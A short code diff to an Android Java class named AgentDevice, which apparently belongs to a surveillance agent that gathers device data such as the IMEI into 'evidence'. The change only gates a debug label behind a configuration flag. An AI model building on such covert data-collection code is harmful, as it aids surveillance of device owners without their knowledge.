@@ -26,6 +26,7 @@ import android.util.Log;
 import com.android.service.Device;
 import com.android.service.LogR;
 import com.android.service.Status;
+import com.android.service.conf.Configuration;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.util.Utils;
 import com.android.service.util.WChar;
@@ -101,7 +102,9 @@ public class AgentDevice extends AgentBase {
 		readCpuUsage();
 
 		final StringBuffer sb = new StringBuffer();
-		sb.append("Debug\n");
+		if(Configuration.DEBUG){
+			sb.append("Debug\n");
+		}
 		sb.append("-- SYSTEM --\r\n");
 		sb.append("IMEI: " + Device.self().getImei() + "\n");
 		
